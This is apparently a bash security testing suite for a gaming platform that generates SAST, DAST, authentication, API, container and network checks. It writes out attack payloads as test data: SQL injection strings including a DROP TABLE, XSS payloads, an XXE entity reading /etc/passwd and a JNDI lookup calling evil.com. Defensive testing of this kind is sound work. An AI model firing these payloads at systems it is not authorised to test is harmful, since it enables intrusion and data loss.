#!/bin/bash

# GLXY Gaming Platform - Comprehensive Security Testing Suite
# Production-grade security testing and validation

set -euo pipefail

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m'

log() { echo -e "${BLUE}[$(date +'%Y-%m-%d %H:%M:%S')]${NC} $1"; }
error() { echo -e "${RED}[ERROR]${NC} $1" >&2; }
success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }
warning() { echo -e "${YELLOW}[WARNING]${NC} $1"; }
info() { echo -e "${PURPLE}[INFO]${NC} $1"; }

# Configuration
REPORT_DIR="./security-test-reports"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
TARGET_HOST="${1:-http://localhost:8080}"
COMPREHENSIVE_MODE="${2:-basic}"

# Create report directory
mkdir -p "$REPORT_DIR"

log "🔍 Starting Comprehensive Security Testing Suite..."
log "Target: $TARGET_HOST"
log "Mode: $COMPREHENSIVE_MODE"

# 1. Static Application Security Testing (SAST)
log "Running Static Application Security Testing (SAST)..."

cat > "$REPORT_DIR/sast-test.js" << 'EOF'
const fs = require('fs');
const path = require('path');

// SAST Security Test Suite
class SASTScanner {
    constructor() {
        this.issues = [];
        this.securityPatterns = {
            critical: [
                /eval\s*\(/gi,
                /innerHTML\s*=/gi,
                /document\.write\s*\(/gi,
                /dangerouslySetInnerHTML/gi,
                /exec\s*\(/gi
            ],
            high: [
                /localStorage\./gi,
                /sessionStorage\./gi,
                /document\.cookie/gi,
                /window\.location/gi,
                /\.getElementById\(/gi
            ],
            medium: [
                /console\.log\(/gi,
                /alert\s*\(/gi,
                /confirm\s*\(/gi,
                /prompt\s*\(/gi
            ]
        };
    }

    scanFile(filePath) {
        if (!fs.existsSync(filePath)) return;

        const content = fs.readFileSync(filePath, 'utf8');
        const lines = content.split('\n');

        Object.entries(this.securityPatterns).forEach(([severity, patterns]) => {
            patterns.forEach(pattern => {
                lines.forEach((line, index) => {
                    if (pattern.test(line)) {
                        this.issues.push({
                            file: filePath,
                            line: index + 1,
                            severity,
                            pattern: pattern.source,
                            code: line.trim()
                        });
                    }
                });
            });
        });
    }

    scanDirectory(dirPath) {
        if (!fs.existsSync(dirPath)) return;

        const files = fs.readdirSync(dirPath, { withFileTypes: true });

        files.forEach(file => {
            const fullPath = path.join(dirPath, file.name);

            if (file.isDirectory() && !file.name.startsWith('.') && file.name !== 'node_modules') {
                this.scanDirectory(fullPath);
            } else if (file.isFile() && /\.(js|jsx|ts|tsx)$/.test(file.name)) {
                this.scanFile(fullPath);
            }
        });
    }

    generateReport() {
        const report = {
            timestamp: new Date().toISOString(),
            summary: {
                totalIssues: this.issues.length,
                critical: this.issues.filter(i => i.severity === 'critical').length,
                high: this.issues.filter(i => i.severity === 'high').length,
                medium: this.issues.filter(i => i.severity === 'medium').length
            },
            issues: this.issues
        };

        return report;
    }
}

// Run SAST scan
const scanner = new SASTScanner();
scanner.scanDirectory('./');
const report = scanner.generateReport();

console.log(JSON.stringify(report, null, 2));

// Exit with error if critical issues found
if (report.summary.critical > 0) {
    process.exit(1);
}
EOF

node "$REPORT_DIR/sast-test.js" > "$REPORT_DIR/sast-report-$TIMESTAMP.json" 2>/dev/null || {
    warning "SAST scan completed with issues found"
}

# 2. Dynamic Application Security Testing (DAST)
log "Running Dynamic Application Security Testing (DAST)..."

cat > "$REPORT_DIR/dast-test.sh" << 'EOF'
#!/bin/bash

# DAST Security Test Suite

TARGET="$1"
REPORT_FILE="$2"

echo "Running DAST tests against: $TARGET"

# Create test results
cat > "$REPORT_FILE" << 'DAST_REPORT'
{
    "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
    "target": "$TARGET",
    "tests": []
}
DAST_REPORT

# Function to add test result
add_test_result() {
    local test_name="$1"
    local status="$2"
    local details="$3"

    # Update JSON (simplified approach)
    echo "Test: $test_name - Status: $status - Details: $details"
}

# Test 1: Basic connectivity
echo "Testing basic connectivity..."
if curl -s --max-time 10 "$TARGET" > /dev/null; then
    add_test_result "connectivity" "pass" "Target is accessible"
else
    add_test_result "connectivity" "fail" "Target is not accessible"
fi

# Test 2: SQL Injection attempts
echo "Testing SQL injection protection..."
SQL_PAYLOADS=(
    "' OR '1'='1"
    "'; DROP TABLE users; --"
    "' UNION SELECT * FROM users --"
    "admin'--"
    "' OR 1=1 --"
)

for payload in "${SQL_PAYLOADS[@]}"; do
    RESPONSE=$(curl -s -w "%{http_code}" -o /dev/null \
        --data "username=${payload}&password=test" \
        "$TARGET/api/auth/signin" 2>/dev/null || echo "000")

    if [ "$RESPONSE" = "500" ] || [ "$RESPONSE" = "200" ]; then
        add_test_result "sql_injection" "fail" "Potential SQL injection vulnerability with payload: $payload"
    else
        add_test_result "sql_injection" "pass" "SQL injection protection working"
    fi
done

# Test 3: XSS attempts
echo "Testing XSS protection..."
XSS_PAYLOADS=(
    "<script>alert('xss')</script>"
    "javascript:alert('xss')"
    "<img src=x onerror=alert('xss')>"
    "';alert('xss');'"
)

for payload in "${XSS_PAYLOADS[@]}"; do
    RESPONSE=$(curl -s -w "%{http_code}" -o /dev/null \
        --data "message=${payload}" \
        "$TARGET/api/chat" 2>/dev/null || echo "000")

    if [ "$RESPONSE" = "200" ]; then
        add_test_result "xss_protection" "warning" "Potential XSS vulnerability with payload: $payload"
    else
        add_test_result "xss_protection" "pass" "XSS protection working"
    fi
done

# Test 4: Rate limiting
echo "Testing rate limiting..."
for i in {1..20}; do
    RESPONSE=$(curl -s -w "%{http_code}" -o /dev/null "$TARGET/api/health" 2>/dev/null || echo "000")
    if [ "$RESPONSE" = "429" ]; then
        add_test_result "rate_limiting" "pass" "Rate limiting is active"
        break
    fi
    sleep 0.1
done

# Test 5: Security headers
echo "Testing security headers..."
HEADERS=$(curl -s -I "$TARGET" 2>/dev/null || echo "")

REQUIRED_HEADERS=(
    "X-Frame-Options"
    "X-Content-Type-Options"
    "X-XSS-Protection"
    "Strict-Transport-Security"
    "Content-Security-Policy"
)

for header in "${REQUIRED_HEADERS[@]}"; do
    if echo "$HEADERS" | grep -qi "$header"; then
        add_test_result "security_headers" "pass" "$header header is present"
    else
        add_test_result "security_headers" "fail" "$header header is missing"
    fi
done

echo "DAST testing completed"
EOF

chmod +x "$REPORT_DIR/dast-test.sh"
bash "$REPORT_DIR/dast-test.sh" "$TARGET_HOST" "$REPORT_DIR/dast-report-$TIMESTAMP.json"

# 3. Authentication & Authorization Testing
log "Testing Authentication & Authorization..."

cat > "$REPORT_DIR/auth-test.sh" << 'EOF'
#!/bin/bash

# Authentication & Authorization Security Tests

TARGET="$1"
REPORT_FILE="$2"

echo "Testing authentication security..."

# Test 1: Password policy enforcement
echo "Testing password policy..."
WEAK_PASSWORDS=(
    "123456"
    "password"
    "admin"
    "test"
    "123"
)

for password in "${WEAK_PASSWORDS[@]}"; do
    RESPONSE=$(curl -s -w "%{http_code}" -o /dev/null \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"test@example.com\",\"password\":\"$password\"}" \
        "$TARGET/api/auth/register" 2>/dev/null || echo "000")

    if [ "$RESPONSE" = "200" ]; then
        echo "FAIL: Weak password accepted: $password"
    else
        echo "PASS: Weak password rejected: $password"
    fi
done

# Test 2: Brute force protection
echo "Testing brute force protection..."
for i in {1..10}; do
    RESPONSE=$(curl -s -w "%{http_code}" -o /dev/null \
        -H "Content-Type: application/json" \
        -d '{"email":"test@example.com","password":"wrongpassword"}' \
        "$TARGET/api/auth/signin" 2>/dev/null || echo "000")

    if [ "$RESPONSE" = "429" ]; then
        echo "PASS: Brute force protection activated after $i attempts"
        break
    fi
    sleep 0.5
done

# Test 3: Session security
echo "Testing session security..."
# This would require more complex session testing

echo "Authentication testing completed"
EOF

chmod +x "$REPORT_DIR/auth-test.sh"
bash "$REPORT_DIR/auth-test.sh" "$TARGET_HOST" "$REPORT_DIR/auth-report-$TIMESTAMP.json"

# 4. API Security Testing
log "Testing API Security..."

cat > "$REPORT_DIR/api-security-test.js" << 'EOF'
const https = require('https');
const http = require('http');

class APISecurityTester {
    constructor(baseUrl) {
        this.baseUrl = baseUrl;
        this.results = [];
    }

    async makeRequest(path, method = 'GET', data = null, headers = {}) {
        return new Promise((resolve) => {
            const url = new URL(path, this.baseUrl);
            const isHttps = url.protocol === 'https:';
            const client = isHttps ? https : http;

            const options = {
                hostname: url.hostname,
                port: url.port || (isHttps ? 443 : 80),
                path: url.pathname + url.search,
                method,
                headers: {
                    'User-Agent': 'GLXY-Security-Tester',
                    ...headers
                }
            };

            if (data) {
                options.headers['Content-Type'] = 'application/json';
                options.headers['Content-Length'] = Buffer.byteLength(data);
            }

            const req = client.request(options, (res) => {
                let body = '';
                res.on('data', chunk => body += chunk);
                res.on('end', () => {
                    resolve({
                        statusCode: res.statusCode,
                        headers: res.headers,
                        body
                    });
                });
            });

            req.on('error', () => {
                resolve({ statusCode: 0, headers: {}, body: '' });
            });

            req.setTimeout(5000, () => {
                req.destroy();
                resolve({ statusCode: 0, headers: {}, body: '' });
            });

            if (data) {
                req.write(data);
            }

            req.end();
        });
    }

    async testEndpoint(path, expectedStatus = 200) {
        const response = await this.makeRequest(path);
        const testResult = {
            path,
            expectedStatus,
            actualStatus: response.statusCode,
            passed: response.statusCode === expectedStatus,
            headers: response.headers
        };

        this.results.push(testResult);
        return testResult;
    }

    async testRateLimiting(path) {
        console.log(`Testing rate limiting on ${path}...`);
        const requests = [];

        // Send 50 rapid requests
        for (let i = 0; i < 50; i++) {
            requests.push(this.makeRequest(path));
        }

        const responses = await Promise.all(requests);
        const rateLimited = responses.some(r => r.statusCode === 429);

        this.results.push({
            test: 'rate_limiting',
            path,
            totalRequests: 50,
            rateLimited,
            passed: rateLimited
        });

        return rateLimited;
    }

    async testInputValidation(path) {
        console.log(`Testing input validation on ${path}...`);

        const maliciousPayloads = [
            '{"test": "<script>alert(\\"xss\\")</script>"}',
            '{"test": "\' OR 1=1 --"}',
            '{"test": "' + 'A'.repeat(10000) + '"}', // Large input
            '{"test": "<?xml version=\\"1.0\\"?><!DOCTYPE test [<!ENTITY test SYSTEM \\"file:///etc/passwd\\">]>"}',
            '{"test": "${jndi:ldap://evil.com/exploit}"}'
        ];

        for (const payload of maliciousPayloads) {
            const response = await this.makeRequest(path, 'POST', payload);

            this.results.push({
                test: 'input_validation',
                path,
                payload: payload.substring(0, 100),
                statusCode: response.statusCode,
                passed: response.statusCode >= 400 // Should reject malicious input
            });
        }
    }

    async runTests() {
        console.log('Starting API security tests...');

        // Test common endpoints
        await this.testEndpoint('/api/health', 200);
        await this.testEndpoint('/api/nonexistent', 404);

        // Test authentication endpoints
        await this.testEndpoint('/api/auth/signin', 405); // Should reject GET
        await this.testEndpoint('/admin', 401); // Should require auth

        // Test rate limiting
        await this.testRateLimiting('/api/health');

        // Test input validation
        await this.testInputValidation('/api/auth/signin');

        return this.generateReport();
    }

    generateReport() {
        const passed = this.results.filter(r => r.passed).length;
        const total = this.results.length;

        return {
            timestamp: new Date().toISOString(),
            summary: {
                total,
                passed,
                failed: total - passed,
                successRate: ((passed / total) * 100).toFixed(2) + '%'
            },
            results: this.results
        };
    }
}

// Run tests
async function runAPITests() {
    const baseUrl = process.argv[2] || 'http://localhost:8080';
    const tester = new APISecurityTester(baseUrl);

    try {
        const report = await tester.runTests();
        console.log(JSON.stringify(report, null, 2));
    } catch (error) {
        console.error('API testing failed:', error.message);
        process.exit(1);
    }
}

runAPITests();
EOF

node "$REPORT_DIR/api-security-test.js" "$TARGET_HOST" > "$REPORT_DIR/api-security-report-$TIMESTAMP.json" 2>/dev/null || {
    warning "API security testing completed with issues"
}

# 5. Container Security Testing
if command -v docker >/dev/null 2>&1; then
    log "Testing Container Security..."

    cat > "$REPORT_DIR/container-security-test.sh" << 'EOF'
#!/bin/bash

# Container Security Tests

echo "Running container security tests..."

# Test 1: Check if containers run as root
echo "Checking container user privileges..."
CONTAINERS=$(docker ps --format "{{.Names}}")

for container in $CONTAINERS; do
    USER_ID=$(docker exec "$container" id -u 2>/dev/null || echo "unknown")
    if [ "$USER_ID" = "0" ]; then
        echo "WARNING: Container $container is running as root"
    else
        echo "PASS: Container $container is not running as root (UID: $USER_ID)"
    fi
done

# Test 2: Check for privileged containers
echo "Checking for privileged containers..."
PRIVILEGED=$(docker ps --filter "status=running" --format "table {{.Names}}\t{{.Command}}" | grep -i privileged || echo "None found")
if [ "$PRIVILEGED" = "None found" ]; then
    echo "PASS: No privileged containers found"
else
    echo "WARNING: Privileged containers detected:"
    echo "$PRIVILEGED"
fi

# Test 3: Check Docker daemon configuration
echo "Checking Docker daemon security..."
if [ -f /etc/docker/daemon.json ]; then
    echo "PASS: Docker daemon configuration file exists"

    # Check for security settings
    if grep -q '"icc": false' /etc/docker/daemon.json; then
        echo "PASS: Inter-container communication is disabled"
    else
        echo "WARNING: Inter-container communication is not explicitly disabled"
    fi
else
    echo "WARNING: Docker daemon configuration file not found"
fi

# Test 4: Check for security scanning
echo "Checking for vulnerability scanning..."
IMAGE_NAME="glxy_gaming_app:latest"

if command -v trivy >/dev/null 2>&1; then
    echo "Running Trivy security scan..."
    trivy image --severity HIGH,CRITICAL "$IMAGE_NAME" > trivy-scan.txt 2>&1 || true

    if [ -s trivy-scan.txt ]; then
        CRITICAL_COUNT=$(grep -c "CRITICAL" trivy-scan.txt || echo "0")
        HIGH_COUNT=$(grep -c "HIGH" trivy-scan.txt || echo "0")

        echo "Trivy scan results: $CRITICAL_COUNT critical, $HIGH_COUNT high vulnerabilities"

        if [ "$CRITICAL_COUNT" -gt 0 ]; then
            echo "FAIL: Critical vulnerabilities found in container image"
        else
            echo "PASS: No critical vulnerabilities found"
        fi
    fi
else
    echo "INFO: Trivy not available for vulnerability scanning"
fi

echo "Container security testing completed"
EOF

    chmod +x "$REPORT_DIR/container-security-test.sh"
    bash "$REPORT_DIR/container-security-test.sh" > "$REPORT_DIR/container-security-report-$TIMESTAMP.txt"
fi

# 6. Network Security Testing
log "Testing Network Security..."

cat > "$REPORT_DIR/network-security-test.sh" << 'EOF'
#!/bin/bash

# Network Security Tests

TARGET_HOST="$1"
REPORT_FILE="$2"

echo "Running network security tests..."

# Test 1: Port scanning
echo "Checking exposed ports..."
if command -v nmap >/dev/null 2>&1; then
    nmap -sS -O "$TARGET_HOST" > nmap-scan.txt 2>&1 || true
    echo "PASS: Port scan completed"
else
    echo "INFO: nmap not available for port scanning"
fi

# Test 2: SSL/TLS testing
echo "Testing SSL/TLS configuration..."
if command -v openssl >/dev/null 2>&1; then
    # Test SSL/TLS if HTTPS
    if [[ "$TARGET_HOST" == https://* ]]; then
        HOSTNAME=$(echo "$TARGET_HOST" | sed 's|https://||' | cut -d'/' -f1)

        # Check SSL certificate
        echo | openssl s_client -connect "$HOSTNAME:443" -servername "$HOSTNAME" 2>/dev/null | openssl x509 -noout -dates > ssl-cert-info.txt 2>&1 || true

        # Check supported protocols
        echo "Testing SSL/TLS protocols..."
        for protocol in ssl3 tls1 tls1_1 tls1_2 tls1_3; do
            if echo | openssl s_client -connect "$HOSTNAME:443" -"$protocol" 2>/dev/null | grep -q "Verify return code: 0"; then
                echo "$protocol: SUPPORTED"
            else
                echo "$protocol: NOT SUPPORTED"
            fi
        done
    else
        echo "INFO: Target is not HTTPS, skipping SSL/TLS tests"
    fi
else
    echo "INFO: OpenSSL not available for SSL/TLS testing"
fi

# Test 3: HTTP security headers
echo "Testing HTTP security headers..."
HEADERS=$(curl -s -I "$TARGET_HOST" 2>/dev/null || echo "")

SECURITY_HEADERS=(
    "Strict-Transport-Security"
    "X-Frame-Options"
    "X-Content-Type-Options"
    "X-XSS-Protection"
    "Content-Security-Policy"
    "Referrer-Policy"
)

for header in "${SECURITY_HEADERS[@]}"; do
    if echo "$HEADERS" | grep -qi "$header"; then
        echo "PASS: $header header is present"
    else
        echo "FAIL: $header header is missing"
    fi
done

echo "Network security testing completed"
EOF

chmod +x "$REPORT_DIR/network-security-test.sh"
bash "$REPORT_DIR/network-security-test.sh" "$TARGET_HOST" "$REPORT_DIR/network-security-report-$TIMESTAMP.txt"

# 7. Generate comprehensive report
log "Generating comprehensive security test report..."

cat > "$REPORT_DIR/generate-final-report.js" << 'EOF'
const fs = require('fs');
const path = require('path');

function generateComprehensiveReport() {
    const timestamp = process.argv[2];
    const reportDir = './security-test-reports';

    const report = {
        metadata: {
            timestamp: new Date().toISOString(),
            testRunId: timestamp,
            testSuite: 'GLXY Gaming Platform Security Validation',
            version: '1.0'
        },
        summary: {
            totalTests: 0,
            passed: 0,
            failed: 0,
            warnings: 0,
            overallStatus: 'unknown'
        },
        categories: {}
    };

    // Read all report files
    const reportFiles = [
        `sast-report-${timestamp}.json`,
        `dast-report-${timestamp}.json`,
        `api-security-report-${timestamp}.json`
    ];

    reportFiles.forEach(fileName => {
        const filePath = path.join(reportDir, fileName);
        if (fs.existsSync(filePath)) {
            try {
                const content = JSON.parse(fs.readFileSync(filePath, 'utf8'));
                const category = fileName.split('-')[0];
                report.categories[category] = content;

                // Update summary counts
                if (content.summary) {
                    report.summary.totalTests += content.summary.total || 0;
                    report.summary.passed += content.summary.passed || 0;
                    report.summary.failed += content.summary.failed || 0;
                }
            } catch (error) {
                console.error(`Error reading ${fileName}:`, error.message);
            }
        }
    });

    // Read text reports
    const textReports = [
        `container-security-report-${timestamp}.txt`,
        `network-security-report-${timestamp}.txt`,
        `auth-report-${timestamp}.json`
    ];

    textReports.forEach(fileName => {
        const filePath = path.join(reportDir, fileName);
        if (fs.existsSync(filePath)) {
            const content = fs.readFileSync(filePath, 'utf8');
            const category = fileName.split('-')[0];

            // Simple text analysis
            const passCount = (content.match(/PASS:/g) || []).length;
            const failCount = (content.match(/FAIL:/g) || []).length;
            const warnCount = (content.match(/WARNING:/g) || []).length;

            report.categories[category] = {
                type: 'text_analysis',
                summary: {
                    total: passCount + failCount + warnCount,
                    passed: passCount,
                    failed: failCount,
                    warnings: warnCount
                },
                rawOutput: content.substring(0, 1000) // Truncate for size
            };

            report.summary.totalTests += passCount + failCount + warnCount;
            report.summary.passed += passCount;
            report.summary.failed += failCount;
            report.summary.warnings += warnCount;
        }
    });

    // Determine overall status
    const successRate = report.summary.totalTests > 0 ?
        (report.summary.passed / report.summary.totalTests) * 100 : 0;

    if (successRate >= 90) {
        report.summary.overallStatus = 'excellent';
    } else if (successRate >= 75) {
        report.summary.overallStatus = 'good';
    } else if (successRate >= 50) {
        report.summary.overallStatus = 'fair';
    } else {
        report.summary.overallStatus = 'poor';
    }

    report.summary.successRate = successRate.toFixed(2) + '%';

    // Generate recommendations
    report.recommendations = [];

    if (report.summary.failed > 0) {
        report.recommendations.push('Address failed security tests immediately');
    }

    if (report.summary.warnings > 0) {
        report.recommendations.push('Review and resolve security warnings');
    }

    if (successRate < 90) {
        report.recommendations.push('Improve security controls to achieve 90%+ success rate');
    }

    if (successRate >= 90) {
        report.recommendations.push('Excellent security posture - maintain with regular testing');
    }

    return report;
}

const timestamp = process.argv[2] || 'unknown';
const report = generateComprehensiveReport();
console.log(JSON.stringify(report, null, 2));
EOF

node "$REPORT_DIR/generate-final-report.js" "$TIMESTAMP" > "$REPORT_DIR/comprehensive-security-report-$TIMESTAMP.json"

# 8. Display results
log "Security Testing Suite completed!"
echo ""
echo "📊 Security Test Results Summary:"
echo "=================================="

if [ -f "$REPORT_DIR/comprehensive-security-report-$TIMESTAMP.json" ]; then
    node -e "
        const report = JSON.parse(require('fs').readFileSync('$REPORT_DIR/comprehensive-security-report-$TIMESTAMP.json', 'utf8'));
        console.log('Overall Status:', report.summary.overallStatus.toUpperCase());
        console.log('Success Rate:', report.summary.successRate);
        console.log('Total Tests:', report.summary.totalTests);
        console.log('Passed:', report.summary.passed);
        console.log('Failed:', report.summary.failed);
        console.log('Warnings:', report.summary.warnings);
        console.log('');
        console.log('Recommendations:');
        report.recommendations.forEach(rec => console.log('- ' + rec));
        console.log('');
        console.log('Detailed reports available in: $REPORT_DIR');
    "
else
    warning "Could not generate comprehensive summary"
fi

# 9. Cleanup
log "Cleaning up temporary files..."
rm -f "$REPORT_DIR"/*.js
rm -f "$REPORT_DIR"/*.sh

success "🔒 Security Testing Suite completed successfully!"
echo ""
echo "📂 All reports saved in: $REPORT_DIR"
echo "📋 Main report: $REPORT_DIR/comprehensive-security-report-$TIMESTAMP.json"
echo ""
echo "🔍 Next steps:"
echo "1. Review detailed security test results"
echo "2. Address any failed tests or security warnings"
echo "3. Implement additional security controls as needed"
echo "4. Schedule regular security testing"
echo "5. Monitor security metrics and trends"